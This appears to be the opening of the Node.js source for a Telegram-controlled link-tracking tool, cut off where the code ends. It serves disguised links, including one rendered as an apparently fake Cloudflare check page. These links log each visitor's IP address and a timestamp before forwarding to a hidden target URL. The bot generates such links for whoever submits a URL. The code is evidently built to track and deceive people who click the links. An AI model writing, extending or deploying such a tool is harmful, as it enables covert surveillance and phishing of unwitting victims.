const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");
var hostURL = process.env["HOST_URL"] || "";
var use1pt = false;
app.get("/w/:path/:uri", (req, res) => {
  var ip; var d = new Date(); d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  if (req.params.path != null) { res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt }); } else { res.redirect("https://t.me/th30neand0nly0ne"); }
});
app.get("/c/:path/:uri", (req, res) => {
  var ip; var d = new Date(); d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  if (req.params.path != null) { res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt }); } else { res.redirect("https://t.me/th30neand0nly0ne"); }
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") { createLink(chatId, msg.text);
